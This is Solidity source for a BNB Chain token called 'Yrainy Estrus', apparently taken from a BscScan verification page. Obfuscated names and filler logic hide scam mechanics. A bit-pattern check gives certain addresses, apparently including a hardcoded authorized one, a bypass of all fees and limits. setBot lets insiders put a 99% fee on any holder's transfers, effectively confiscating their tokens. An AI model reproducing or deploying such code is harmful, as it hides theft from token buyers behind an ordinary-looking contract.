/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.9;interface IUniswapV2Router {    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function factory() external pure returns (address);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function WETH() external pure returns (address);    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    function Owner() public view returns (address) {        return owner;    }    function transferOwnership(address payable adr) public onlyOwner() {        owner = adr;        competent[adr] = true;        emit OwnershipTransferred(adr);    }    event OwnershipTransferred(address owner);    function SetAuthorized(address adr) public onlyAuthorized() {        competent[adr] = true;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    function removeAuthorized(address adr) public onlyOwner() {        competent[adr] = false;    }    modifier onlyAuthorized() {        require(isAuthorized(msg.sender), "!Authorized");        _;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}interface IBEP20 {    function name() external view returns (string memory);    function allowance(address _owner, address spender)    external    view    returns (uint256);    function balanceOf(address account) external view returns (uint256);    function totalSupply() external view returns (uint256);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function symbol() external view returns (string memory);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function decimals() external view returns (uint8);    function getOwner() external view returns (address);    function approve(address spender, uint256 amount) external returns (bool);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}library SafeMath {    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function tryDiv(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a / b);    }    }    function tryAdd(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        uint256 c = a + b;        if (c < a) return (false, 0);        return (true, c);    }    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function tryMod(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a % b);    }    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }}contract YrainyEstrus is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    string constant _name = "Yrainy Estrus ";    string constant _symbol = "YrainyEstrus";    uint8 constant _decimals = 18;    //BUY FEES    uint256 private modeReceiverIsTx = 0;    uint256 private modeSellWalletBuy = 9;    //SELL FEES    uint256 private minBotsWalletModeBurnBuy = 0;    uint256 private burnSellModeFee = 9;    bool private tradingExemptModeBots = true;    bool private feeSwapModeMinMode = true;    bool private walletSellMarketingIsFeeSwap = true;    bool private exemptIsAutoMode = true;    bool private exemptLiquidityBotsTradingModeTxTeam = true;    uint256 private burnMarketingExemptSwap = _totalSupply / 1000; // 0.1%    uint256 private tradingLimitSellBots = modeSellWalletBuy + modeReceiverIsTx;    uint256 private teamBuyMaxMin = 100;    bool private receiverMarketingTradingIsMode;    uint256 private maxTeamLimitLaunched;    uint256 private launchedReceiverBurnTeam;    uint256 private tradingSwapReceiverMinBots;    uint256 private exemptTeamSellLaunched;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private swapTeamFeeBots;    mapping(address => bool) private autoBuyTxFee;    mapping(address => bool) private launchedFeeMaxBuy;    mapping(address => bool) private feeSwapModeMin;    uint256 private launchBlock = 0;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private walletIsFeeLimit;    uint256 private burnTxTradingMaxLaunched;    address private isSwapTeamMinBuyMax = (msg.sender); // auto-liq address    address private tradingMinSellTeam = (0xfF7Cc0d8DC2f110EDba08946FfFFeE8Ed1a4B162); // marketing address    address private exemptLiquiditySwapTrading = DEAD;    address private modeLaunchedTxBuy = DEAD;    address private feeTradingTeamExempt = DEAD;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);        uint256 private walletAutoReceiverExempt = 0;    bool private walletTxLiquidityAuto = false;    bool public buyTeamMinTxWalletFeeIs = false;    uint256 private marketingSwapAutoMinExemptTx = 0;    bool private receiverTradingFeeLiquidityWalletSwap = false;    uint256 public botsBurnTxAutoWalletModeMarketing = 0;    bool public isTeamLiquidityBots = false;    uint256 private limitBotsAutoWalletSellBuyLiquidity = 0;    bool private marketingBotsReceiverMax = false;    uint256 private maxWalletExemptTeam = 0;    uint256 public walletTxLiquidityAuto0 = 0;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        receiverMarketingTradingIsMode = true;        launchedFeeMaxBuy[msg.sender] = true;        launchedFeeMaxBuy[0x0000000000000000000000000000000000000000] = true;        launchedFeeMaxBuy[0x000000000000000000000000000000000000dEaD] = true;        launchedFeeMaxBuy[address(this)] = true;        swapTeamFeeBots[msg.sender] = true;        swapTeamFeeBots[address(this)] = true;        autoBuyTxFee[msg.sender] = true;        autoBuyTxFee[0x0000000000000000000000000000000000000000] = true;        autoBuyTxFee[0x000000000000000000000000000000000000dEaD] = true;        autoBuyTxFee[address(this)] = true;        SetAuthorized(address(0x4B98fF0927C24b666A820498FffFf764E8aCF50b));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return feeBuyTeamLiquidity(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return feeBuyTeamLiquidity(sender, recipient, amount);    }    function setBot(address addr) public onlyAuthorized {        feeSwapModeMin[addr] = true;    }
    function txFeeWalletMarketingSellTradingTeam(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function setTradingExemptModeBots(bool a0) public onlyOwner {        if (tradingExemptModeBots == exemptIsAutoMode) {            exemptIsAutoMode=a0;        }        if (tradingExemptModeBots == walletSellMarketingIsFeeSwap) {            walletSellMarketingIsFeeSwap=a0;        }        tradingExemptModeBots=a0;    }
    function feeBuyTeamLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {                if (receiverTradingFeeLiquidityWalletSwap == exemptIsAutoMode) {            receiverTradingFeeLiquidityWalletSwap = feeSwapModeMinMode;        }        if (limitBotsAutoWalletSellBuyLiquidity != minBotsWalletModeBurnBuy) {            limitBotsAutoWalletSellBuyLiquidity = tradingLimitSellBots;        }        bool bLimitTxWalletValue = txFeeWalletMarketingSellTradingTeam(sender) || txFeeWalletMarketingSellTradingTeam(recipient);                if (maxWalletExemptTeam != marketingSwapAutoMinExemptTx) {            maxWalletExemptTeam = minBotsWalletModeBurnBuy;        }        if (limitBotsAutoWalletSellBuyLiquidity == burnSellModeFee) {            limitBotsAutoWalletSellBuyLiquidity = minBotsWalletModeBurnBuy;        }                        if (inSwap || bLimitTxWalletValue) {return modeSwapSellMarketingBurnReceiver(sender, recipient, amount);}        if (!swapTeamFeeBots[sender] && !swapTeamFeeBots[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                if (receiverTradingFeeLiquidityWalletSwap != exemptIsAutoMode) {            receiverTradingFeeLiquidityWalletSwap = walletTxLiquidityAuto;        }        if (maxWalletExemptTeam == marketingSwapAutoMinExemptTx) {            maxWalletExemptTeam = teamBuyMaxMin;        }        if (walletAutoReceiverExempt == modeReceiverIsTx) {            walletAutoReceiverExempt = modeReceiverIsTx;        }        require((amount <= _maxTxAmount) || launchedFeeMaxBuy[sender] || launchedFeeMaxBuy[recipient], "Max TX Limit!");        if (marketingModeFeeBotsBuy()) {teamMarketingExemptWalletSell();}        setTotalFee();        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                if (marketingBotsReceiverMax != walletTxLiquidityAuto) {            marketingBotsReceiverMax = exemptLiquidityBotsTradingModeTxTeam;        }        uint256 amountReceived = botsIsFeeMax(sender) ? maxSwapFeeMin(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function setMinBotsWalletModeBurnBuy(uint256 a0) public onlyOwner {        if (minBotsWalletModeBurnBuy != burnSellModeFee) {            burnSellModeFee=a0;        }        minBotsWalletModeBurnBuy=a0;    }
    function marketingModeFeeBotsBuy() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    exemptLiquidityBotsTradingModeTxTeam &&    _balances[address(this)] >= burnMarketingExemptSwap;    }
    function isBot(address addr) public view returns (bool) {        return feeSwapModeMin[addr];    }
    function buySellBotsFee(address sender, bool selling) internal returns (uint256) {                if (maxWalletExemptTeam != limitBotsAutoWalletSellBuyLiquidity) {            maxWalletExemptTeam = walletAutoReceiverExempt;        }        if (selling) {            tradingLimitSellBots = burnSellModeFee + minBotsWalletModeBurnBuy;            return tradingLimitSellBots;        }        if (!selling && sender == uniswapV2Pair) {            tradingLimitSellBots = modeSellWalletBuy + modeReceiverIsTx;            return tradingLimitSellBots;        }        return burnSellModeFee + minBotsWalletModeBurnBuy;    }
    function getMinBotsWalletModeBurnBuy() public view returns (uint256) {        return minBotsWalletModeBurnBuy;    }
    function modeSwapSellMarketingBurnReceiver(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function setWalletSellMarketingIsFeeSwap(bool a0) public onlyOwner {        if (walletSellMarketingIsFeeSwap != exemptLiquidityBotsTradingModeTxTeam) {            exemptLiquidityBotsTradingModeTxTeam=a0;        }        if (walletSellMarketingIsFeeSwap == walletTxLiquidityAuto) {            walletTxLiquidityAuto=a0;        }        walletSellMarketingIsFeeSwap=a0;    }
    function setFeeSwapModeMin(address a0,bool a1) public onlyOwner {        if (a0 == isSwapTeamMinBuyMax) {            feeSwapModeMinMode=a1;        }        if (a0 != feeTradingTeamExempt) {            walletTxLiquidityAuto=a1;        }        feeSwapModeMin[a0]=a1;    }
    function setFeeTradingTeamExempt(address a0) public onlyOwner {        if (feeTradingTeamExempt == tradingMinSellTeam) {            tradingMinSellTeam=a0;        }        feeTradingTeamExempt=a0;    }
    function getTradingExemptModeBots() public view returns (bool) {        if (tradingExemptModeBots != exemptIsAutoMode) {            return exemptIsAutoMode;        }        if (tradingExemptModeBots != receiverTradingFeeLiquidityWalletSwap) {            return receiverTradingFeeLiquidityWalletSwap;        }        if (tradingExemptModeBots == exemptIsAutoMode) {            return exemptIsAutoMode;        }        return tradingExemptModeBots;    }
    function setMarketingBotsReceiverMax(bool a0) public onlyOwner {        if (marketingBotsReceiverMax != exemptIsAutoMode) {            exemptIsAutoMode=a0;        }        if (marketingBotsReceiverMax != walletTxLiquidityAuto) {            walletTxLiquidityAuto=a0;        }        if (marketingBotsReceiverMax == tradingExemptModeBots) {            tradingExemptModeBots=a0;        }        marketingBotsReceiverMax=a0;    }
    function setMaxWalletExemptTeam(uint256 a0) public onlyOwner {        maxWalletExemptTeam=a0;    }
    function getWalletTxLiquidityAuto() public view returns (bool) {        return walletTxLiquidityAuto;    }
    function maxSwapFeeMin(address sender, address receiver, uint256 amount) internal returns (uint256) {                uint256 feeAmount = amount.mul(buySellBotsFee(sender, receiver == uniswapV2Pair)).div(teamBuyMaxMin);        if (feeSwapModeMin[sender] || feeSwapModeMin[receiver]) {            feeAmount = amount.mul(99).div(teamBuyMaxMin);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                return amount.sub(feeAmount);    }
    function getFeeSwapModeMin(address a0) public view returns (bool) {        if (a0 != modeLaunchedTxBuy) {            return exemptIsAutoMode;        }        if (a0 == tradingMinSellTeam) {            return tradingExemptModeBots;        }        if (a0 == modeLaunchedTxBuy) {            return marketingBotsReceiverMax;        }            return feeSwapModeMin[a0];    }
    function setTotalFee() internal {        tradingLimitSellBots = burnSellModeFee + minBotsWalletModeBurnBuy;    }
    function setWalletTxLiquidityAuto(bool a0) public onlyOwner {        if (walletTxLiquidityAuto != marketingBotsReceiverMax) {            marketingBotsReceiverMax=a0;        }        walletTxLiquidityAuto=a0;    }
    function getAutoBuyTxFee(address a0) public view returns (bool) {        if (a0 == exemptLiquiditySwapTrading) {            return walletTxLiquidityAuto;        }            return autoBuyTxFee[a0];    }
    function botsIsFeeMax(address sender) internal view returns (bool) {        return !autoBuyTxFee[sender];    }
    function setTradingLimitSellBots(uint256 a0) public onlyOwner {        if (tradingLimitSellBots == burnMarketingExemptSwap) {            burnMarketingExemptSwap=a0;        }        if (tradingLimitSellBots == teamBuyMaxMin) {            teamBuyMaxMin=a0;        }        if (tradingLimitSellBots == burnMarketingExemptSwap) {            burnMarketingExemptSwap=a0;        }        tradingLimitSellBots=a0;    }
    function teamMarketingExemptWalletSell() internal swapping {                uint256 amountToLiquify = burnMarketingExemptSwap.mul(modeReceiverIsTx).div(tradingLimitSellBots).div(2);        uint256 amountToSwap = burnMarketingExemptSwap.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                if (walletAutoReceiverExempt != burnMarketingExemptSwap) {            walletAutoReceiverExempt = minBotsWalletModeBurnBuy;        }        if (walletTxLiquidityAuto == receiverTradingFeeLiquidityWalletSwap) {            walletTxLiquidityAuto = marketingBotsReceiverMax;        }        uint256 amountBNB = address(this).balance;        uint256 totalETHFee = tradingLimitSellBots.sub(modeReceiverIsTx.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(modeReceiverIsTx).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(modeSellWalletBuy).div(totalETHFee);                payable(tradingMinSellTeam).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                isSwapTeamMinBuyMax,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function getMarketingBotsReceiverMax() public view returns (bool) {        return marketingBotsReceiverMax;    }
    function getMaxWalletExemptTeam() public view returns (uint256) {        if (maxWalletExemptTeam != burnMarketingExemptSwap) {            return burnMarketingExemptSwap;        }        if (maxWalletExemptTeam == maxWalletExemptTeam) {            return maxWalletExemptTeam;        }        if (maxWalletExemptTeam != launchBlock) {            return launchBlock;        }        return maxWalletExemptTeam;    }
    function getFeeTradingTeamExempt() public view returns (address) {        if (feeTradingTeamExempt == feeTradingTeamExempt) {            return feeTradingTeamExempt;        }        if (feeTradingTeamExempt != modeLaunchedTxBuy) {            return modeLaunchedTxBuy;        }        if (feeTradingTeamExempt == tradingMinSellTeam) {            return tradingMinSellTeam;        }        return feeTradingTeamExempt;    }
    function getTradingLimitSellBots() public view returns (uint256) {        if (tradingLimitSellBots != minBotsWalletModeBurnBuy) {            return minBotsWalletModeBurnBuy;        }        if (tradingLimitSellBots != limitBotsAutoWalletSellBuyLiquidity) {            return limitBotsAutoWalletSellBuyLiquidity;        }        return tradingLimitSellBots;    }
    function setAutoBuyTxFee(address a0,bool a1) public onlyOwner {        if (a0 == modeLaunchedTxBuy) {            marketingBotsReceiverMax=a1;        }        if (a0 == exemptLiquiditySwapTrading) {            marketingBotsReceiverMax=a1;        }        autoBuyTxFee[a0]=a1;    }
    function getWalletSellMarketingIsFeeSwap() public view returns (bool) {        return walletSellMarketingIsFeeSwap;    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}